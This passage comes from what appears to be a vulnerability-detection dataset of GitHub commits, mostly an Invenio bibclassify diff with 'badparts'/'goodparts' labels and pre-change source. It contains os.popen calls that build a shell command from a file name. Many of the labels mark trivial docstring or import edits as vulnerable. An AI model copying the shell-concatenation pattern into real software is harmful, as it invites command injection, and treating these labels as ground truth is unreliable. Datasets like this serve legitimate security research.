test.yaml\")\n    subparsers = parser.add_subparsers(dest=\"cmd\")\n\n    # Create parser for the editor command\n    subparser_editor = subparsers.add_parser('edit', help=\"Launches the editor to edit or create new systems and \"\n                                                          \"components\")\n    # Create parser for the run command\n    subparser_run = subparsers.add_parser('run', help=\"Launches the setup specified by the --config argument\")\n    # Create parser for validator\n    subparser_val = subparsers.add_parser('validate', help=\"Validate the setup specified by the --config argument\")\n\n    subparser_remote = subparsers.add_parser('slave', help=\"Run a component locally without controlling it. The \"\n                                                           \"control is taken care of the remote master invoking \"\n                                                           \"this command.\\nIf run with the --kill flag, the \"\n                                                           \"passed component will be killed\")\n\n    subparser_val.add_argument(\"--visual\", help=\"Generate and show a graph image\", action=\"store_true\")\n\n    remote_mutex = subparser_remote.add_mutually_exclusive_group(required=False)\n\n    remote_mutex.add_argument('-k', '--kill', help=\"switch to kill mode\", action=\"store_true\")\n    remote_mutex.add_argument('-c', '--check', help=\"Run a component check\", action=\"store_true\")\n\n    args = parser.parse_args()\n    logger.debug(args)\n\n    if args.cmd == 'edit':\n        logger.debug(\"Launching editor mode\")\n\n    elif args.cmd == 'run':\n        logger.debug(\"Launching runner mode\")\n\n        cc = ControlCenter(args.config)\n        cc.init()\n        start_gui(cc)\n\n    elif args.cmd == 'validate':\n        logger.debug(\"Launching validation mode\")\n        cc = ControlCenter(args.config)\n        if args.visual:\n            cc.set_dependencies(False)\n            cc.draw_graph()\n        else:\n            cc.set_dependencies(True)\n\n    elif args.cmd == 'slave':\n        logger.debug(\"Launching slave mode\")\n        sl = SlaveLauncher(args.config, args.kill, args.check)\n\n        if args.check:\n            sl.run_check()\n        else:\n            sl.init()\n\n\n###################\n# GUI\n###################\ndef start_gui(control_center):\n    app = QtGui.QApplication(sys.argv)\n    main_window = QtGui.QMainWindow()\n    ui = hyperGUI.UiMainWindow()\n    ui.ui_init(main_window, control_center)\n    main_window.show()\n    sys.exit(app.exec_())\n"}}, "msg": "Utilize slave execution for remote checks\n\nOn the remote host hyperion is started in slave check mode and the exit\ncode is converted to a check state, which is then interpreted."}}, "https://github.com/nakajima-hiro/invenio": {"4b56c071c54a0e1f1a86dca49fe455207d4148c7": {"url": "https://api.github.com/repos/nakajima-hiro/invenio/commits/4b56c071c54a0e1f1a86dca49fe455207d4148c7", "html_url": "https://github.com/nakajima-hiro/invenio/commit/4b56c071c54a0e1f1a86dca49fe455207d4148c7", "sha": "4b56c071c54a0e1f1a86dca49fe455207d4148c7", "keyword": "remote code execution improve", "diff": "diff --git a/invenio/legacy/bibclassify/engine.py b/invenio/legacy/bibclassify/engine.py\nindex 561dbdfbc..ec35dd6b9 100644\n--- a/invenio/legacy/bibclassify/engine.py\n+++ b/invenio/legacy/bibclassify/engine.py\n@@ -35,6 +35,7 @@\n from __future__ import print_function\n \n import os\n+import re\n from six import iteritems\n import config as bconfig\n \n@@ -44,8 +45,8 @@\n import keyword_analyzer as keyworder\n import acronym_analyzer as acronymer\n \n-from invenio.utils.url import make_user_agent_string\n from invenio.utils.text import encode_for_xml\n+from invenio.utils.filedownload import download_url\n \n log = bconfig.get_logger(\"bibclassify.engine\")\n \n@@ -60,7 +61,6 @@ def output_keywords_for_sources(input_sources, taxonomy_name, output_mode=\"text\"\n                                 rebuild_cache=False, only_core_tags=False, extract_acronyms=False,\n                                 api=False, **kwargs):\n     \"\"\"Output the keywords for each source in sources.\"\"\"\n-\n     # Inner function which does the job and it would be too much work to\n     # refactor the call (and it must be outside the loop, before it did\n     # not process multiple files)\n@@ -68,6 +68,12 @@ def process_lines():\n         if output_mode == \"text\":\n             print(\"Input file: %s\" % source)\n \n+        line_nb = len(text_lines)\n+        word_nb = 0\n+        for line in text_lines:\n+            word_nb += len(re.findall(\"\\S+\", line))\n+\n+        log.info(\"Remote file has %d lines and %d words.\" % (line_nb, word_nb))\n         output = get_keywords_from_text(\n             text_lines,\n             taxonomy_name,\n@@ -110,8 +116,8 @@ def process_lines():\n                 process_lines()\n         else:\n             # Treat as a URL.\n-            text_lines = extractor.text_lines_from_url(entry,\n-                                                       user_agent=make_user_agent_string(\"BibClassify\"))\n+            local_file = download_url(entry)\n+            text_lines = extractor.text_lines_from_local_file(local_file)\n             if text_lines:\n                 source = entry.split(\"/\")[-1]\n                 process_lines()\n@@ -122,9 +128,10 @@ def get_keywords_from_local_file(local_file, taxonomy_name, output_mode=\"text\",\n                                  match_mode=\"full\", no_cache=False, with_author_keywords=False,\n                                  rebuild_cache=False, only_core_tags=False, extract_acronyms=False, api=False,\n                                  **kwargs):\n-    \"\"\"Outputs keywords reading a local file. Arguments and output are the same\n-    as for :see: get_keywords_from_text() \"\"\"\n+    \"\"\"Output keywords reading a local file.\n \n+    Arguments and output are the same as for :see: get_keywords_from_text().\n+    \"\"\"\n     log.info(\"Analyzing keywords for local file %s.\" % local_file)\n     text_lines = extractor.text_lines_from_local_file(local_file)\n \n@@ -147,7 +154,7 @@ def get_keywords_from_text(text_lines, taxonomy_name, output_mode=\"text\",\n                            with_author_keywords=False, rebuild_cache=False,\n                            only_core_tags=False, extract_acronyms=False,\n                            **kwargs):\n-    \"\"\"Extract keywords from the list of strings\n+    \"\"\"Extract keywords from the list of strings.\n \n     :param text_lines: list of strings (will be normalized before being\n         joined into one string)\n@@ -165,7 +172,6 @@ def get_keywords_from_text(text_lines, taxonomy_name, output_mode=\"text\",\n         (single_keywords, composite_keywords, author_keywords, acronyms)\n         for other output modes it returns formatted string\n     \"\"\"\n-\n     cache = reader.get_cache(taxonomy_name)\n     if not cache:\n         reader.set_cache(taxonomy_name,\n@@ -202,7 +208,8 @@ def get_keywords_from_text(text_lines, taxonomy_name, output_mode=\"text\",\n \n \n def extract_single_keywords(skw_db, fulltext):\n-    \"\"\"Find single keywords in the fulltext\n+    \"\"\"Find single keywords in the fulltext.\n+\n     :var skw_db: list of KeywordToken objects\n     :var fulltext: string, which will be searched\n     :return : dictionary of matches in a format {\ndiff --git a/invenio/legacy/bibclassify/ontology_reader.py b/invenio/legacy/bibclassify/ontology_reader.py\nindex 25624f0e9..008ee553f 100644\n--- a/invenio/legacy/bibclassify/ontology_reader.py\n+++ b/invenio/legacy/bibclassify/ontology_reader.py\n@@ -485,12 +485,11 @@ def _get_ckw_components(new_vals, label):\n                 for label in self.compositeof:\n                     _get_ckw_components(new_vals, label)\n                 self.compositeof = new_vals\n-            except TaxonomyError:\n+            except TaxonomyError as err:\n                 # the composites will be empty\n                 # (better than to have confusing, partial matches)\n                 self.compositeof = []\n-                log.error(\n-                    'We reset this composite keyword, so that it does not match anything. Please fix the taxonomy.')\n+                log.error(err)\n \n     def isComposite(self):\n         \"\"\"Return value of _composite.\"\"\"\ndiff --git a/invenio/legacy/bibclassify/text_extractor.py b/invenio/legacy/bibclassify/text_extractor.py\nindex 4fcb10352..56fa43c6b 100644\n--- a/invenio/legacy/bibclassify/text_extractor.py\n+++ b/invenio/legacy/bibclassify/text_extractor.py\n@@ -1,7 +1,7 @@\n # -*- coding: utf-8 -*-\n #\n # This file is part of Invenio.\n-# Copyright (C) 2008, 2009, 2010, 2011, 2013, 2014 CERN.\n+# Copyright (C) 2008, 2009, 2010, 2011, 2013, 2014, 2015 CERN.\n #\n # Invenio is free software; you can redistribute it and/or\n # modify it under the terms of the GNU General Public License as\n@@ -17,8 +17,7 @@\n # along with Invenio; if not, write to the Free Software Foundation, Inc.,\n # 59 Temple Place, Suite 330, Boston, MA 02111-1307, USA.\n \n-\"\"\"\n-BibClassify text extractor.\n+\"\"\"BibClassify text extractor.\n \n This module provides method to extract the fulltext from local or remote\n documents. Currently 2 formats of documents are supported: PDF and text\n@@ -35,8 +34,7 @@\n \n import os\n import re\n-import tempfile\n-import urllib2\n+\n from invenio.legacy.bibclassify import config as bconfig\n \n if bconfig.STANDALONE:\n@@ -52,7 +50,7 @@\n \n \n def is_pdf(document):\n-    \"\"\"Checks if a document is a PDF file. Returns True if is is.\"\"\"\n+    \"\"\"Check if a document is a PDF file and returns True if is is.\"\"\"\n     if not executable_exists('pdftotext'):\n         log.warning(\"GNU file was not found on the system. \"\n                     \"Switching to a weak file extension test.\")\n@@ -64,25 +62,25 @@ def is_pdf(document):\n     # version 4.10.\n     file_output = os.popen('file ' + re.escape(document)).read()\n     try:\n-        filetype = file_output.split(\":\")[1]\n+        filetype = file_output.split(\":\")[-1]\n     except IndexError:\n         log.error(\"Your version of the 'file' utility seems to \"\n-                  \"be unsupported. Please report this to cds.support@cern.ch.\")\n+                  \"be unsupported.\")\n         raise Exception('Incompatible pdftotext')\n \n     pdf = filetype.find(\"PDF\") > -1\n     # This is how it should be done however this is incompatible with\n     # file version 4.10.\n-    #os.popen('file -bi ' + document).read().find(\"application/pdf\")\n+    # os.popen('file -bi ' + document).read().find(\"application/pdf\")\n     return pdf\n \n \n def text_lines_from_local_file(document, remote=False):\n-    \"\"\"Returns the fulltext of the local file.\n+    \"\"\"Return the fulltext of the local file.\n+\n     @var document: fullpath to the file that should be read\n     @var remote: boolean, if True does not count lines (gosh!)\n     @return: list of lines if st was read or an empty list\"\"\"\n-\n     try:\n         if is_pdf(document):\n             if not executable_exists(\"pdftotext\"):\n@@ -99,85 +97,13 @@ def text_lines_from_local_file(document, remote=False):\n     lines = [line.decode(\"utf-8\", 'replace') for line in filestream]\n     filestream.close()\n \n-    if not _is_english_text('\\n'.join(lines)):\n-        log.warning(\"It seems the file '%s' is unvalid and doesn't \"\n-                    \"contain text. Please communicate this file to the Invenio \"\n-                    \"team.\" % document)\n-\n-    line_nb = len(lines)\n-    word_nb = 0\n-    for line in lines:\n-        word_nb += len(re.findall(\"\\S+\", line))\n-\n     # Discard lines that do not contain at least one word.\n-    lines = [line for line in lines if _ONE_WORD.search(line) is not None]\n-\n-    if not remote:\n-        log.info(\"Local file has %d lines and %d words.\" % (line_nb, word_nb))\n-\n-    return lines\n-\n-\n-def _is_english_text(text):\n-    \"\"\"\n-    Checks if a text is correct english.\n-    Computes the number of words in the text and compares it to the\n-    expected number of words (based on an average size of words of 5.1\n-    letters).\n-\n-    @param text_lines: the text to analyze\n-    @type text_lines:  string\n-    @return:           True if the text is English, False otherwise\n-    @rtype:            Boolean\n-    \"\"\"\n-    # Consider one word and one space.\n-    avg_word_length = 2.55 + 1\n-    expected_word_number = float(len(text)) / avg_word_length\n-\n-    words = [word\n-             for word in re.split('\\W', text)\n-             if word.isalpha()]\n-\n-    word_number = len(words)\n-\n-    return word_number > expected_word_number\n-\n-\n-def text_lines_from_url(url, user_agent=\"\"):\n-    \"\"\"Returns the fulltext of the file found at the URL.\"\"\"\n-    request = urllib2.Request(url)\n-    if user_agent:\n-        request.add_header(\"User-Agent\", user_agent)\n-    try:\n-        distant_stream = urlopen(request)\n-        # Write the URL content to a temporary file.\n-        local_file = tempfile.mkstemp(prefix=\"bibclassify.\")[1]\n-        local_stream = open(local_file, \"w\")\n-        local_stream.write(distant_stream.read())\n-        local_stream.close()\n-    except:\n-        log.error(\"Unable to read from URL %s.\" % url)\n-        return None\n-    else:\n-        # Read lines from the temporary file.\n-        lines = text_lines_from_local_file(local_file, remote=True)\n-        os.remove(local_file)\n-\n-        line_nb = len(lines)\n-        word_nb = 0\n-        for line in lines:\n-            word_nb += len(re.findall(\"\\S+\", line))\n-\n-        log.info(\"Remote file has %d lines and %d words.\" % (line_nb, word_nb))\n-\n-        return lines\n+    return [line for line in lines if _ONE_WORD.search(line) is not None]\n \n \n def executable_exists(executable):\n-    \"\"\"Tests if an executable is available on the system.\"\"\"\n+    \"\"\"Test if an executable is available on the system.\"\"\"\n     for directory in os.getenv(\"PATH\").split(\":\"):\n         if os.path.exists(os.path.join(directory, executable)):\n             return True\n     return False\n-\n-\n", "message": "", "files": {"/invenio/legacy/bibclassify/engine.py": {"changes": [{"diff": "\n import acronym_analyzer as acronymer\n \n-from invenio.utils.url import make_user_agent_string\n from invenio.utils.text import encode_for_xml\n+from invenio.utils.filedownload import download_url\n \n log = bconfig.get_logger(\"bibclassify.engine\")\n \n", "add": 1, "remove": 1, "filename": "/invenio/legacy/bibclassify/engine.py", "badparts": ["from invenio.utils.url import make_user_agent_string"], "goodparts": ["from invenio.utils.filedownload import download_url"]}, {"diff": "\n                 process_lines()\n         else:\n             # Treat as a URL.\n-            text_lines = extractor.text_lines_from_url(entry,\n-                                                       user_agent=make_user_agent_string(\"BibClassify\"))\n+            local_file = download_url(entry)\n+            text_lines = extractor.text_lines_from_local_file(local_file)\n             if text_lines:\n                 source = entry.split(\"/\")[-1]\n                 process_lines()\n", "add": 2, "remove": 2, "filename": "/invenio/legacy/bibclassify/engine.py", "badparts": ["            text_lines = extractor.text_lines_from_url(entry,", "                                                       user_agent=make_user_agent_string(\"BibClassify\"))"], "goodparts": ["            local_file = download_url(entry)", "            text_lines = extractor.text_lines_from_local_file(local_file)"]}, {"diff": "\n                                  match_mode=\"full\", no_cache=False, with_author_keywords=False,\n                                  rebuild_cache=False, only_core_tags=False, extract_acronyms=False, api=False,\n                                  **kwargs):\n-    \"\"\"Outputs keywords reading a local file. Arguments and output are the same\n-    as for :see: get_keywords_from_text() \"\"\"\n+    \"\"\"Output keywords reading a local file.\n \n+    Arguments and output are the same as for :see: get_keywords_from_text().\n+    \"\"\"\n     log.info(\"Analyzing keywords for local file %s.\" % local_file)\n     text_lines = extractor.text_lines_from_local_file(local_file)\n \n", "add": 3, "remove": 2, "filename": "/invenio/legacy/bibclassify/engine.py", "badparts": ["    \"\"\"Outputs keywords reading a local file. Arguments and output are the same", "    as for :see: get_keywords_from_text() \"\"\""], "goodparts": ["    \"\"\"Output keywords reading a local file.", "    Arguments and output are the same as for :see: get_keywords_from_text().", "    \"\"\""]}, {"diff": "\n                            with_author_keywords=False, rebuild_cache=False,\n                            only_core_tags=False, extract_acronyms=False,\n                            **kwargs):\n-    \"\"\"Extract keywords from the list of strings\n+    \"\"\"Extract keywords from the list of strings.\n \n     :param text_lines: list of strings (will be normalized before being\n         joined into one string)\n", "add": 1, "remove": 1, "filename": "/invenio/legacy/bibclassify/engine.py", "badparts": ["    \"\"\"Extract keywords from the list of strings"], "goodparts": ["    \"\"\"Extract keywords from the list of strings."]}, {"diff": "\n \n \n def extract_single_keywords(skw_db, fulltext):\n-    \"\"\"Find single keywords in the fulltext\n+    \"\"\"Find single keywords in the fulltext.\n+\n     :var skw_db: list of KeywordToken objects\n     :var fulltext: string, which will be searched\n     :return : dictionary of matches in a format {", "add": 2, "remove": 1, "filename": "/invenio/legacy/bibclassify/engine.py", "badparts": ["    \"\"\"Find single keywords in the fulltext"], "goodparts": ["    \"\"\"Find single keywords in the fulltext."]}], "source": "\n \"\"\" BibClassify engine. This module is the main module of BibClassify. its two main methods are output_keywords_for_sources and get_keywords_from_text. The first one output keywords for a list of sources(local files or URLs, PDF or text) while the second one outputs the keywords for text lines(which are obtained using the module bibclassify_text_normalizer). This module also takes care of the different outputs(text, MARCXML or HTML). But unfortunately there is a confusion between running in a standalone mode and producing output suitable for printing, and running in a web-based mode where the webtemplate is used. For the moment the pieces of the representation code are left in this module. \"\"\" from __future__ import print_function import os from six import iteritems import config as bconfig from invenio.legacy.bibclassify import ontology_reader as reader import text_extractor as extractor import text_normalizer as normalizer import keyword_analyzer as keyworder import acronym_analyzer as acronymer from invenio.utils.url import make_user_agent_string from invenio.utils.text import encode_for_xml log=bconfig.get_logger(\"bibclassify.engine\") def output_keywords_for_sources(input_sources, taxonomy_name, output_mode=\"text\", output_limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER, spires=False, match_mode=\"full\", no_cache=False, with_author_keywords=False, rebuild_cache=False, only_core_tags=False, extract_acronyms=False, api=False, **kwargs): \"\"\"Output the keywords for each source in sources.\"\"\" def process_lines(): if output_mode==\"text\": print(\"Input file: %s\" % source) output=get_keywords_from_text( text_lines, taxonomy_name, output_mode=output_mode, output_limit=output_limit, spires=spires, match_mode=match_mode, no_cache=no_cache, with_author_keywords=with_author_keywords, rebuild_cache=rebuild_cache, only_core_tags=only_core_tags, extract_acronyms=extract_acronyms ) if api: return output else: if isinstance(output, dict): for i in output: print(output[i]) for entry in input_sources: log.info(\"Trying to read input file %s.\" % entry) text_lines=None source=\"\" if os.path.isdir(entry): for filename in os.listdir(entry): if filename.startswith('.'): continue filename=os.path.join(entry, filename) if os.path.isfile(filename): text_lines=extractor.text_lines_from_local_file(filename) if text_lines: source=filename process_lines() elif os.path.isfile(entry): text_lines=extractor.text_lines_from_local_file(entry) if text_lines: source=os.path.basename(entry) process_lines() else: text_lines=extractor.text_lines_from_url(entry, user_agent=make_user_agent_string(\"BibClassify\")) if text_lines: source=entry.split(\"/\")[-1] process_lines() def get_keywords_from_local_file(local_file, taxonomy_name, output_mode=\"text\", output_limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER, spires=False, match_mode=\"full\", no_cache=False, with_author_keywords=False, rebuild_cache=False, only_core_tags=False, extract_acronyms=False, api=False, **kwargs): \"\"\"Outputs keywords reading a local file. Arguments and output are the same as for:see: get_keywords_from_text() \"\"\" log.info(\"Analyzing keywords for local file %s.\" % local_file) text_lines=extractor.text_lines_from_local_file(local_file) return get_keywords_from_text(text_lines, taxonomy_name, output_mode=output_mode, output_limit=output_limit, spires=spires, match_mode=match_mode, no_cache=no_cache, with_author_keywords=with_author_keywords, rebuild_cache=rebuild_cache, only_core_tags=only_core_tags, extract_acronyms=extract_acronyms) def get_keywords_from_text(text_lines, taxonomy_name, output_mode=\"text\", output_limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER, spires=False, match_mode=\"full\", no_cache=False, with_author_keywords=False, rebuild_cache=False, only_core_tags=False, extract_acronyms=False, **kwargs): \"\"\"Extract keywords from the list of strings :param text_lines: list of strings(will be normalized before being joined into one string) :param taxonomy_name: string, name of the taxonomy_name :param output_mode: string -text|html|marcxml|raw :param output_limit: int :param spires: boolean, if True marcxml output reflect spires codes. :param match_mode: str -partial|full; in partial mode only beginning of the fulltext is searched. :param no_cache: boolean, means loaded definitions will not be saved. :param with_author_keywords: boolean, extract keywords from the pdfs. :param rebuild_cache: boolean :param only_core_tags: boolean :return: if output_mode=raw, it will return (single_keywords, composite_keywords, author_keywords, acronyms) for other output modes it returns formatted string \"\"\" cache=reader.get_cache(taxonomy_name) if not cache: reader.set_cache(taxonomy_name, reader.get_regular_expressions(taxonomy_name, rebuild=rebuild_cache, no_cache=no_cache)) cache=reader.get_cache(taxonomy_name) _skw=cache[0] _ckw=cache[1] text_lines=normalizer.cut_references(text_lines) fulltext=normalizer.normalize_fulltext(\"\\n\".join(text_lines)) if match_mode==\"partial\": fulltext=_get_partial_text(fulltext) author_keywords=None if with_author_keywords: author_keywords=extract_author_keywords(_skw, _ckw, fulltext) acronyms={} if extract_acronyms: acronyms=extract_abbreviations(fulltext) single_keywords=extract_single_keywords(_skw, fulltext) composite_keywords=extract_composite_keywords(_ckw, fulltext, single_keywords) if only_core_tags: single_keywords=clean_before_output(_filter_core_keywors(single_keywords)) composite_keywords=_filter_core_keywors(composite_keywords) else: single_keywords=clean_before_output(single_keywords) return get_keywords_output(single_keywords, composite_keywords, taxonomy_name, author_keywords, acronyms, output_mode, output_limit, spires, only_core_tags) def extract_single_keywords(skw_db, fulltext): \"\"\"Find single keywords in the fulltext :var skw_db: list of KeywordToken objects :var fulltext: string, which will be searched :return: dictionary of matches in a format{ <keyword object>,[[position, position...],], .. } or empty{} \"\"\" return keyworder.get_single_keywords(skw_db, fulltext) or{} def extract_composite_keywords(ckw_db, fulltext, skw_spans): \"\"\"Returns a list of composite keywords bound with the number of occurrences found in the text string. :var ckw_db: list of KewordToken objects(they are supposed to be composite ones) :var fulltext: string to search in :skw_spans: dictionary of already identified single keywords :return: dictionary of matches in a format{ <keyword object>,[[position, position...],[info_about_matches]], .. } or empty{} \"\"\" return keyworder.get_composite_keywords(ckw_db, fulltext, skw_spans) or{} def extract_abbreviations(fulltext): \"\"\"Extract acronyms from the fulltext :var fulltext: utf-8 string :return: dictionary of matches in a formt{ <keyword object>,[matched skw or ckw object,....] } or empty{} \"\"\" acronyms={} K=reader.KeywordToken for k, v in acronymer.get_acronyms(fulltext).items(): acronyms[K(k, type='acronym')]=v return acronyms def extract_author_keywords(skw_db, ckw_db, fulltext): \"\"\"Finds out human defined keyowrds in a text string. Searches for the string \"Keywords:\" and its declinations and matches the following words. :var skw_db: list single kw object :var ckw_db: list of composite kw objects :var fulltext: utf-8 string :return: dictionary of matches in a formt{ <keyword object>,[matched skw or ckw object,....] } or empty{} \"\"\" akw={} K=reader.KeywordToken for k, v in keyworder.get_author_keywords(skw_db, ckw_db, fulltext).items(): akw[K(k, type='author-kw')]=v return akw def get_keywords_output(single_keywords, composite_keywords, taxonomy_name, author_keywords=None, acronyms=None, style=\"text\", output_limit=0, spires=False, only_core_tags=False): \"\"\"Returns a formatted string representing the keywords according to the chosen style. This is the main routing call, this function will also strip unwanted keywords before output and limits the number of returned keywords :var single_keywords: list of single keywords :var composite_keywords: list of composite keywords :var taxonomy_name: string, taxonomy name :keyword author_keywords: dictionary of author keywords extracted from fulltext :keyword acronyms: dictionary of extracted acronyms :keyword style: text|html|marc :keyword output_limit: int, number of maximum keywords printed(it applies to single and composite keywords separately) :keyword spires: boolen meaning spires output style :keyword only_core_tags: boolean \"\"\" categories={} single_keywords_p=_sort_kw_matches(single_keywords) composite_keywords_p=_sort_kw_matches(composite_keywords) for w in single_keywords_p: categories[w[0].concept]=w[0].type for w in single_keywords_p: categories[w[0].concept]=w[0].type complete_output=_output_complete(single_keywords_p, composite_keywords_p, author_keywords, acronyms, spires, only_core_tags, limit=output_limit) functions={\"text\": _output_text, \"marcxml\": _output_marc, \"html\": _output_html, \"dict\": _output_dict} my_styles={} for s in style: if s !=\"raw\": my_styles[s]=functions[s](complete_output, categories) else: if output_limit > 0: my_styles[\"raw\"]=(_kw(_sort_kw_matches(single_keywords, output_limit)), _kw(_sort_kw_matches(composite_keywords, output_limit)), author_keywords, _kw(_sort_kw_matches(acronyms, output_limit))) else: my_styles[\"raw\"]=(single_keywords_p, composite_keywords_p, author_keywords, acronyms) return my_styles def build_marc(recid, single_keywords, composite_keywords, spires=False, author_keywords=None, acronyms=None): \"\"\"Create xml record. :var recid: ingeter :var single_keywords: dictionary of kws :var composite_keywords: dictionary of kws :keyword spires: please don't use, left for historical reasons :keyword author_keywords: dictionary of extracted keywords :keyword acronyms: dictionary of extracted acronyms :return: str, marxml \"\"\" output=['<collection><record>\\n' '<controlfield tag=\"001\">%s</controlfield>' % recid] single_keywords=single_keywords.items() composite_keywords=composite_keywords.items() output.append(_output_marc(single_keywords, composite_keywords, author_keywords, acronyms)) output.append('</record></collection>') return '\\n'.join(output) def _output_marc(output_complete, categories, kw_field=bconfig.CFG_MAIN_FIELD, auth_field=bconfig.CFG_AUTH_FIELD, acro_field=bconfig.CFG_ACRON_FIELD, provenience='BibClassify'): \"\"\"Output the keywords in the MARCXML format. :var skw_matches: list of single keywords :var ckw_matches: list of composite keywords :var author_keywords: dictionary of extracted author keywords :var acronyms: dictionary of acronyms :var spires: boolean, True=generate spires output -BUT NOTE: it is here only not to break compatibility, in fact spires output should never be used for xml because if we read marc back into the KeywordToken objects, we would not find them :keyword provenience: string that identifies source(authority) that assigned the contents of the field :return: string, formatted MARC\"\"\" kw_template=('<datafield tag=\"%s\" ind1=\"%s\" ind2=\"%s\">\\n' ' <subfield code=\"2\">%s</subfield>\\n' ' <subfield code=\"a\">%s</subfield>\\n' ' <subfield code=\"n\">%s</subfield>\\n' ' <subfield code=\"9\">%s</subfield>\\n' '</datafield>\\n') output=[] tag, ind1, ind2=_parse_marc_code(kw_field) for keywords in(output_complete[\"Single keywords\"], output_complete[\"Core keywords\"]): for kw in keywords: output.append(kw_template %(tag, ind1, ind2, encode_for_xml(provenience), encode_for_xml(kw), keywords[kw], encode_for_xml(categories[kw]))) for field, keywords in((auth_field, output_complete[\"Author keywords\"]), (acro_field, output_complete[\"Acronyms\"])): if keywords and len(keywords) and field: tag, ind1, ind2=_parse_marc_code(field) for kw, info in keywords.items(): output.append(kw_template %(tag, ind1, ind2, encode_for_xml(provenience), encode_for_xml(kw), '', encode_for_xml(categories[kw]))) return \"\".join(output) def _output_complete(skw_matches=None, ckw_matches=None, author_keywords=None, acronyms=None, spires=False, only_core_tags=False, limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER): if limit: resized_skw=skw_matches[0:limit] resized_ckw=ckw_matches[0:limit] else: resized_skw=skw_matches resized_ckw=ckw_matches results={\"Core keywords\": _get_core_keywords(skw_matches, ckw_matches, spires=spires)} if not only_core_tags: results[\"Author keywords\"]=_get_author_keywords(author_keywords, spires=spires) results[\"Composite keywords\"]=_get_compositekws(resized_ckw, spires=spires) results[\"Single keywords\"]=_get_singlekws(resized_skw, spires=spires) results[\"Field codes\"]=_get_fieldcodes(resized_skw, resized_ckw, spires=spires) results[\"Acronyms\"]=_get_acronyms(acronyms) return results def _output_dict(complete_output, categories): return{ \"complete_output\": complete_output, \"categories\": categories } def _output_text(complete_output, categories): \"\"\"Output the results obtained in text format. :return: str, html formatted output \"\"\" output=\"\" for result in complete_output: list_result=complete_output[result] if list_result: list_result_sorted=sorted(list_result, key=lambda x: list_result[x], reverse=True) output +=\"\\n\\n{0}:\\n\".format(result) for element in list_result_sorted: output +=\"\\n{0}{1}\".format(list_result[element], element) output +=\"\\n--\\n{0}\".format(_signature()) return output def _output_html(complete_output, categories): \"\"\"Output the same as txt output does, but HTML formatted. :var skw_matches: sorted list of single keywords :var ckw_matches: sorted list of composite keywords :var author_keywords: dictionary of extracted author keywords :var acronyms: dictionary of acronyms :var spires: boolean :var only_core_tags: boolean :keyword limit: int, number of printed keywords :return: str, html formatted output \"\"\" return \"\"\"<html> <head> <title>Automatically generated keywords by bibclassify</title> </head> <body> {0} </body> </html>\"\"\".format( _output_text(complete_output).replace('\\n', '<br>') ).replace('\\n', '') def _get_singlekws(skw_matches, spires=False): \"\"\" :var skw_matches: dict of{keyword:[info,...]} :keyword spires: bool, to get the spires output :return: list of formatted keywords \"\"\" output={} for single_keyword, info in skw_matches: output[single_keyword.output(spires)]=len(info[0]) return output def _get_compositekws(ckw_matches, spires=False): \"\"\" :var ckw_matches: dict of{keyword:[info,...]} :keyword spires: bool, to get the spires output :return: list of formatted keywords \"\"\" output={} for composite_keyword, info in ckw_matches: output[composite_keyword.output(spires)]={\"numbers\": len(info[0]), \"details\": info[1]} return output def _get_acronyms(acronyms): \"\"\"Return a formatted list of acronyms.\"\"\" acronyms_str={} if acronyms: for acronym, expansions in iteritems(acronyms): expansions_str=\", \".join([\"%s(%d)\" % expansion for expansion in expansions]) acronyms_str[acronym]=expansions_str return acronyms def _get_author_keywords(author_keywords, spires=False): \"\"\"Format the output for the author keywords. :return: list of formatted author keywors \"\"\" out={} if author_keywords: for keyword, matches in author_keywords.items(): skw_matches=matches[0] ckw_matches=matches[1] matches_str=[] for ckw, spans in ckw_matches.items(): matches_str.append(ckw.output(spires)) for skw, spans in skw_matches.items(): matches_str.append(skw.output(spires)) if matches_str: out[keyword]=matches_str else: out[keyword]=0 return out def _get_fieldcodes(skw_matches, ckw_matches, spires=False): \"\"\"Return the output for the field codes. :var skw_matches: dict of{keyword:[info,...]} :var ckw_matches: dict of{keyword:[info,...]} :keyword spires: bool, to get the spires output :return: string\"\"\" fieldcodes={} output={} for skw, _ in skw_matches: for fieldcode in skw.fieldcodes: fieldcodes.setdefault(fieldcode, set()).add(skw.output(spires)) for ckw, _ in ckw_matches: if len(ckw.fieldcodes): for fieldcode in ckw.fieldcodes: fieldcodes.setdefault(fieldcode, set()).add(ckw.output(spires)) else: for kw in ckw.getComponents(): for fieldcode in kw.fieldcodes: fieldcodes.setdefault(fieldcode, set()).add('%s*' % ckw.output(spires)) fieldcodes.setdefault('*', set()).add(kw.output(spires)) for fieldcode, keywords in fieldcodes.items(): output[fieldcode]=', '.join(keywords) return output def _get_core_keywords(skw_matches, ckw_matches, spires=False): \"\"\"Return the output for the field codes. :var skw_matches: dict of{keyword:[info,...]} :var ckw_matches: dict of{keyword:[info,...]} :keyword spires: bool, to get the spires output :return: set of formatted core keywords \"\"\" output={} category={} def _get_value_kw(kw): \"\"\"Help to sort the Core keywords.\"\"\" i=0 while kw[i].isdigit(): i +=1 if i > 0: return int(kw[:i]) else: return 0 for skw, info in skw_matches: if skw.core: output[skw.output(spires)]=len(info[0]) category[skw.output(spires)]=skw.type for ckw, info in ckw_matches: if ckw.core: output[ckw.output(spires)]=len(info[0]) else: i=0 for c in ckw.getComponents(): if c.core: output[c.output(spires)]=info[1][i] i +=1 return output def _filter_core_keywors(keywords): matches={} for kw, info in keywords.items(): if kw.core: matches[kw]=info return matches def _signature(): \"\"\"Print out the bibclassify signature. return 'bibclassify v%s' %(bconfig.VERSION,) def clean_before_output(kw_matches): \"\"\"Return a clean copy of the keywords data structure. Stripped off the standalone and other unwanted elements\"\"\" filtered_kw_matches={} for kw_match, info in iteritems(kw_matches): if not kw_match.nostandalone: filtered_kw_matches[kw_match]=info return filtered_kw_matches def _skw_matches_comparator(kw0, kw1): \"\"\" Compare 2 single keywords objects. First by the number of their spans(ie. how many times they were found), if it is equal it compares them by lenghts of their labels. \"\"\" list_comparison=cmp(len(kw1[1][0]), len(kw0[1][0])) if list_comparison: return list_comparison if kw0[0].isComposite() and kw1[0].isComposite(): component_avg0=sum(kw0[1][1]) / len(kw0[1][1]) component_avg1=sum(kw1[1][1]) / len(kw1[1][1]) component_comparison=cmp(component_avg1, component_avg0) if component_comparison: return component_comparison return cmp(len(str(kw1[0])), len(str(kw0[0]))) def _kw(keywords): 